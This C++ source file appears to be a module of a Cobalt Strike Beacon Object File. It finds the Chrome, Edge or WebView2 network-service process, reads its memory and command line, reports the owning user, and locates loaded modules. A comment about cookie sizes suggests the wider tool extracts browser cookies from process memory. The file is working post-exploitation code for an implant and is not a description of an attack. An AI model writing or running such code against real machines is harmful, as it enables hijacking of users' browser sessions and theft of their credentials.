#define _AMD64_
#include <Windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <Shlwapi.h>

#include "PEB.h"

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation,
    ProcessQuotaLimits,
    ProcessIoCounters,
    ProcessVmCounters,
    ProcessTimes,
    ProcessBasePriority,
    ProcessRaisePriority,
    ProcessDebugPort,
    ProcessExceptionPort,
    ProcessAccessToken,
    ProcessLdtInformation,
    ProcessLdtSize,
    ProcessDefaultHardErrorMode,
    ProcessIoPortHandlers,		  // Note: this is kernel mode only
    ProcessPooledUsageAndLimits,
    ProcessWorkingSetWatch,
    ProcessUserModeIOPL,
    ProcessEnableAlignmentFaultFixup,
    ProcessPriorityClass,
    ProcessWx86Information,
    ProcessHandleCount,
    ProcessAffinityMask,
    ProcessPriorityBoost,
    ProcessDeviceMap,
    ProcessSessionInformation,
    ProcessForegroundInformation,
    ProcessWow64Information,
    ProcessImageFileName,
    ProcessLUIDDeviceMapsEnabled,
    ProcessBreakOnTermination,
    ProcessDebugObjectHandle,
    ProcessDebugFlags,
    ProcessHandleTracing,
    ProcessIoPriority,
    ProcessExecuteFlags,
    ProcessTlsInformation,
    ProcessCookie,
    ProcessImageInformation,
    ProcessCycleTime,
    ProcessPagePriority,
    ProcessInstrumentationCallback,
    ProcessThreadStackAllocation,
    ProcessWorkingSetWatchEx,
    ProcessImageFileNameWin32,
    ProcessImageFileMapping,
    ProcessAffinityUpdateMode,
    ProcessMemoryAllocationMode,
    ProcessGroupInformation,
    ProcessTokenVirtualizationEnabled,
    ProcessConsoleHostProcess,
    ProcessWindowInformation,
    MaxProcessInfoClass			 // MaxProcessInfoClass should always be the last enum
} PROCESSINFOCLASS;

typedef LONG KPRIORITY;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef NTSTATUS(NTAPI* NtQueryInformationProcess)(
    IN  HANDLE ProcessHandle,
    IN  PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN  ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );

#define MAX_NAME 256

BOOL GetTokenUser(IN HANDLE hProcess, formatp* buffer) {

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
    {
        DEBUG_PRINT_ERROR_MESSAGE(L"GetTokenUser OpenProcessToken failed!");
        return FALSE;
    }

    PTOKEN_USER hTokenUser = { 0 };
    DWORD dwSize = 0;

    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize)) {
        DWORD dwError = GetLastError();
        if (dwError != ERROR_INSUFFICIENT_BUFFER) {
            DEBUG_PRINT_ERROR_MESSAGE(L"GetTokenUser GetTokenInformation querying buffer size failed!");
            return FALSE;
        }
    }

    hTokenUser = (PTOKEN_USER)malloc(dwSize);

    if (!GetTokenInformation(hToken, TokenUser, hTokenUser, dwSize, &dwSize)) {
        DEBUG_PRINT_ERROR_MESSAGE(L"GetTokenUser GetTokenInformation failed!");
        free(hTokenUser);
        return FALSE;
    }

    if (hTokenUser == NULL) {
        free(hTokenUser);
        return FALSE;
    }

    wchar_t* UserName = (wchar_t*)malloc(sizeof(wchar_t) * MAX_NAME);
    UserName[0] = L'\0';
    wchar_t* DomainName = (wchar_t*)malloc(sizeof(wchar_t) * MAX_NAME);
    DomainName[0] = L'\0';

    DWORD dwMaxUserName = MAX_NAME;
    DWORD dwMaxDomainName = MAX_NAME;
    SID_NAME_USE SidUser = SidTypeUser;
    if (!LookupAccountSidW(NULL, hTokenUser->User.Sid, UserName, &dwMaxUserName, DomainName, &dwMaxDomainName, &SidUser)) {
        DEBUG_PRINT_ERROR_MESSAGE(L"GetTokenUser LookupAccountSidW failed!");
        free(hTokenUser);
        return FALSE;
    }

    BeaconFormatPrintf(buffer, "%ls", DomainName);
    BeaconFormatPrintf(buffer, "\\");
    BeaconFormatPrintf(buffer, "%ls", UserName);

    free(hTokenUser);
    free(UserName);
    free(DomainName);
    return TRUE;
}

BOOL ReadRemoteProcessPEB(IN HANDLE hProcess, OUT PEB* peb) {

    HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
    if (hNtDll == NULL || hNtDll == INVALID_HANDLE_VALUE) {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("LoadLibrary could not load ntdll"));
        return FALSE;
    }
    NtQueryInformationProcess pNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION processInfo{ 0 };
    ULONG szInfo = 0;

    if (SUCCEEDED(pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInfo, sizeof(PROCESS_BASIC_INFORMATION), &szInfo))
        && szInfo == sizeof(PROCESS_BASIC_INFORMATION)
        && processInfo.PebBaseAddress) {

        size_t szPEB = 0;

        if (!ReadProcessMemory(hProcess, processInfo.PebBaseAddress, peb, sizeof(PEB), &szPEB) || szPEB < sizeof(PEB)) {
            DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read Chrome PEB"));
            return FALSE;
        }
        else
            return TRUE;
    }
    else
    {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("ProcessBasicInformation failed"));
        return FALSE;
    }

    return FALSE;
}

BOOL ReadPEBProcessParameters(HANDLE hProcess, PEB* peb, WCHAR** args) {

    UNICODE_STRING commandLine;
    if (!ReadProcessMemory(hProcess, &peb->ProcessParameters->CommandLine, &commandLine, sizeof(commandLine), NULL))
    {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Could not read CommandLine!\n"));
        return FALSE;
    }

    *args = (WCHAR*)malloc(commandLine.MaximumLength);
    if (*args != 0 && !ReadProcessMemory(hProcess, commandLine.Buffer, *args, commandLine.MaximumLength, NULL))
    {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Could not read the command line string!\n"));
        free(*args);
        return FALSE;
    }

    return TRUE;
}

//wcsstr has an overload and so the dynamic resolution doesn't work
//Classic way of defining functions for BOFs would work, but that would break the debug build
//This sphaghetti solutions does well for now
const wchar_t* CustomWcsStr(const wchar_t* dest, const wchar_t* src) {
    if (*src == L'\0')
        return dest;

    while (*dest != L'\0') {
        const wchar_t* h = dest;
        const wchar_t* n = src;

        while (*n != L'\0' && towlower(*h) == towlower(*n)) {
            ++h;
            ++n;
        }
        if (*n == L'\0')
            return dest;

        ++dest;
    }
    return nullptr;
}

BOOL FindCorrectProcessPID(LPCWSTR processName, DWORD* pid, HANDLE* hProcess)
{
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("CreateToolhelp32Snapshot failed"));
        return FALSE;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hProcessSnap, &pe32))
    {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Process32First failed"));
        CloseHandle(hProcessSnap);
        return(FALSE);
    }

    //Target Chrome process has the following flag, this is how we find the right PID
    //--utility-sub-type=network.mojom.NetworkService
    const WCHAR* flags = L"--utility-sub-type=network.mojom.NetworkService";

    do
    {
        if (wcscmp(pe32.szExeFile, processName) == 0)
        {
            PEB peb = { 0 };
            HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (ReadRemoteProcessPEB(hHandle, &peb))
            {
                WCHAR* commandLine{0};
                if (ReadPEBProcessParameters(hHandle, &peb, &commandLine) && &commandLine != 0)
                {
                    if (CustomWcsStr(commandLine, flags) != 0)
                    {
                        formatp buffer;
                        int bufsize = MAX_NAME * 3;
                        BeaconFormatAlloc(&buffer, bufsize); // RFC 6265 specifies: "At least 4096 bytes per cookie"

                        BeaconFormatPrintf(&buffer, "Found browser process: %d\n", pe32.th32ProcessID);
                        BeaconFormatPrintf(&buffer, "    Process owner: ");

                        GetTokenUser(hHandle, &buffer);
                        BeaconFormatPrintf(&buffer, "\n\n");

                        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, &bufsize), bufsize);
                        BeaconFormatFree(&buffer);

                        *pid = pe32.th32ProcessID;
                        *hProcess = hHandle;
                        free(commandLine);
                        CloseHandle(hProcessSnap);
                        return TRUE;
                    }
                    free(commandLine);
                }
            }
            CloseHandle(hHandle);
        }

    } while (Process32NextW(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return FALSE;
}

void FindAllSuitableProcesses(LPCWSTR processName)
{
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("CreateToolhelp32Snapshot failed"));
        return;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hProcessSnap, &pe32))
    {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Process32First failed"));
        CloseHandle(hProcessSnap);
        return;
    }

    //Target Chrome process has the following flag, this is how we find the right PID
    //--utility-sub-type=network.mojom.NetworkService
    const WCHAR* flags = L"--utility-sub-type=network.mojom.NetworkService";

    formatp buffer;
    int bufsize = MAX_NAME * 3;
    BeaconFormatAlloc(&buffer, bufsize);

    do
    {
        if (wcscmp(pe32.szExeFile, processName) == 0)
        {
            PEB peb = { 0 };
            HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (ReadRemoteProcessPEB(hHandle, &peb))
            {
                WCHAR* commandLine{ 0 };
                if (ReadPEBProcessParameters(hHandle, &peb, &commandLine) && &commandLine != 0)
                {
                    if (CustomWcsStr(commandLine, flags) != 0)
                    {
                        BeaconFormatPrintf(&buffer, "Found browser process: %d\n", pe32.th32ProcessID);
                        BeaconFormatPrintf(&buffer, "    Process owner: ");

                        GetTokenUser(hHandle, &buffer);
                        BeaconFormatPrintf(&buffer, "\n\n");

                        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, &bufsize), bufsize);
                        BeaconFormatReset(&buffer);
                    }
                }
                free(commandLine);
            }
            CloseHandle(hHandle);
        }

    } while (Process32NextW(hProcessSnap, &pe32));

    BeaconFormatFree(&buffer);
    CloseHandle(hProcessSnap);
}

BOOL GetRemoteModuleBaseAddress(HANDLE hProcess, const wchar_t* moduleName, uintptr_t& baseAddress, DWORD* moduleSize) {

    DWORD szModules = sizeof(HMODULE) * 1024; //Should be enough ;)
    HMODULE* hModules = (HMODULE*)malloc(szModules);
    DWORD cbNeeded;

    if (hModules == 0 || !EnumProcessModulesEx(hProcess, hModules, szModules, &cbNeeded, LIST_MODULES_ALL)) {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("EnumProcessModulesEx failed"));
        free(hModules);
        return FALSE;
    }

    for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i) {
        wchar_t szModuleName[MAX_PATH];
        if (GetModuleBaseNameW(hProcess, hModules[i], szModuleName, sizeof(szModuleName) / sizeof(wchar_t)) == 0) {
            DEBUG_PRINT_ERROR_MESSAGE(TEXT("GetModuleBaseName failed"));
            continue;
        }
        if (_wcsicmp(szModuleName, moduleName) == 0) {
            MODULEINFO moduleInfo;
            if (!GetModuleInformation(hProcess, hModules[i], &moduleInfo, sizeof(moduleInfo))) {
                DEBUG_PRINT_ERROR_MESSAGE(TEXT("GetModuleInformation failed"));
                free(hModules);
                return FALSE;
            }
            baseAddress = reinterpret_cast<uintptr_t>(moduleInfo.lpBaseOfDll);
            *moduleSize = moduleInfo.SizeOfImage;
            free(hModules);
            return TRUE;
        }
    }
    free(hModules);
    return FALSE;
}

BOOL GetProcessName(HANDLE hProcess, TargetVersion &targetBrowser) {

    wchar_t processPath[MAX_PATH];
    DWORD size = sizeof(processPath) / sizeof(processPath[0]);

    // Query the full process image name
    if (!QueryFullProcessImageNameW(hProcess, 0, processPath, &size)) {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("QueryFullProcessImageName failed to get target process name"));
        return FALSE;
    }

    const wchar_t* executableName = PathFindFileNameW(processPath);
    if (wcscmp(executableName, L"chrome.exe") == 0)
    {
        targetBrowser = Chrome;
        return TRUE;
    }
    if (wcscmp(executableName, L"msedge.exe") == 0)
    {
        targetBrowser = Edge;
        return TRUE;
    }
    if (wcscmp(executableName, L"msedgewebview2.exe") == 0)
    {
        targetBrowser = Webview2;
        return TRUE;
    }
    return FALSE;
}

BOOL GetProcessHandle(DWORD pid, HANDLE* hProcess) {
    HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hHandle == NULL || hHandle == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("OpenProcess failed"));
        return FALSE;
    }
    *hProcess = hHandle;
    return TRUE;
}

BOOL IsWow64(HANDLE hProcess) {
    BOOL isBrowserWow64 = FALSE;
    if (!IsWow64Process(hProcess, &isBrowserWow64)) {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("IsWow64Process failed for browser process"));
        CloseHandle(hProcess);
        return TRUE;
    }
    if (isBrowserWow64) {
        CloseHandle(hProcess);
        return TRUE;
    }

    return FALSE;
}